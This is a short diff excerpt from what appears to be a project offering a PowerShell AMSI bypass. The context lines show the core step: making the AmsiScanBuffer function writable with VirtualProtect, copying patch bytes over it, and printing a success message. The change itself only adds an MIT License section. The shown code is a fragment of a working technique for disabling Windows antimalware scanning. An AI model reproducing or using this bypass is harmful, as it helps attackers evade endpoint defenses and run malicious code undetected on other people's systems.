@@ -94,3 +94,8 @@ $Kernel32::VirtualProtect($AmsiScanBuffer, [UInt32]6, 0x40, [Ref]$oldProtect)
 [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $AmsiScanBuffer, $patch.Length)
 
 Write-Host "AMSI Patched Successfully!"
+
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for details.
